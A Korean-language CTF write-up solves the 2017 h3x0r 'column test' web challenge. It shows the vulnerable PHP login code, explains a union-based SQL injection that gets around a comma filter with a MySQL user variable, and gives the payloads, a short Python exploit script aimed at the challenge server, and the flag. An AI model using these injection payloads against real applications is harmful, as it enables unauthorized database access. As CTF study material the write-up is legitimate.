# 2017 h3x0r - [WEB] column test

## Key words

- SQLi
- mysql variable

## Solution

문제 페이지에 접근하면 다음과 같은 PHP 소스를 제공해 줍니다.

```php
<?php

/*
 *      if you see the password column name,
 *      you will get the flag~!
 *
 */

include("./dbconfig.php");
$id = $_GET['id'];
$pw = $_GET['pw'];

if ( isset($id) || isset($pw) ) {
    if (preg_match("/info|sche|,/i", $id))
        exit("no hack ~_~");
    if (preg_match("/info|sche/i", $pw))
        exit("no hack ~_~");

    $query = "SELECT {$pw_column_name}, {$id_column_name} FROM {$table} WHERE {$id_column_name}='{$id}' AND {$pw_column_name}='{$pw}'";
    $result = mysqli_fetch_array(mysqli_query($conn ,$query));

    if ($result['id']) {
        echo "Hello {$result['id']}";
    } else {
        echo "DB error";
    }
} else {
    highlight_file(__FILE__);
}

?>
```

목적은 mysql DB에 있는 password `컬럼 이름`에 flag가 존재한다고 합니다.

그 외에는 기본적인 sql injection이 될 수 있도록 설정이 되어 있습니다.

컬럼명을 알기 위해, `load_file`, `inf\x0bomation_sch\x0bma`등등을 시도 해 보았지만 모두 실패 하였고, 결론적으로 PHP에서 변수에 값을 넣은 값을 쿼리에 출력될 수 있는 곳에 위치 시켜야 합니다.

`{$id}`를 `1' union select ` 로 만들게 되면 뒷 부분은 다음과 같이 되게 됩니다.

- ... where {$id_column_name} = '`1' union select `' AND {$pw_column_name}='{$pw}'

이렇게 되면 뒷 `union select`이후 뒷 부분이 `' AND {$pw_column_name}='{$pw} ` 이런식으로 스트링이 들어 가게 됩니다.

문제에서 약간 트릭이 있었던 부분은 출력 시, `id`를 출력하게 되어 있는데 이는 두 번째 필드 입니다. 그런데 `id`입력에 `,`를 넣을 수 없어 `pw`쪽에서 `,`를 처리 해서 컬럼을 맞춰줘야 하는데 이 부분이 까다로웠습니다.

위 union select 쿼리를 하게 되면 결국 `pw`쪽에서 콤마를 넣어서 컬럼 2개를 맞춰 줘야 하는데 이렇게 되면 우리가 열심히 넣었던 첫 번째 컬럼이 출력이 되질 않습니다.

그래서 `' AND ...` 이 스트링을 `mysql variable`형태로 변환하여 뒷 부분에서 찍어 주어 플래그를 얻을 수 있었습니다.

- {$id} = `1' union select @t=`
- {$pw} = `,@t;-- -`
- SELECT {$pw_column_name}, {$id_column_name} FROM {$table} WHERE {$id_column_name}='`1' union select @t:=`' AND {$id_column_name}='`,@t;-- -`'

결과적으로, `Hello SDNYMFJ7bXlzcWxfdmFyaWFibGVfaXNfc29fdXNlZnVsfQ=` 라는 스트링이 출력되었고 뒤에 `base64`에 `=` 패딩 하나더 추가 하여 디코딩 하면 플래그가 출력 됩니다.

## Code

```python
import requests

url = "http://13.124.1.51/web/prob15/index.php"
params = {
	"id": "1' union select @t:=",
	"pw": ",@t;-- -"
}
r = requests.get(url, params=params)
print r.content

# result
# SDNYMFJ7bXlzcWxfdmFyaWFibGVfaXNfc29fdXNlZnVsfQ==
# H3X0R{mysql_variable_is_so_useful}
```
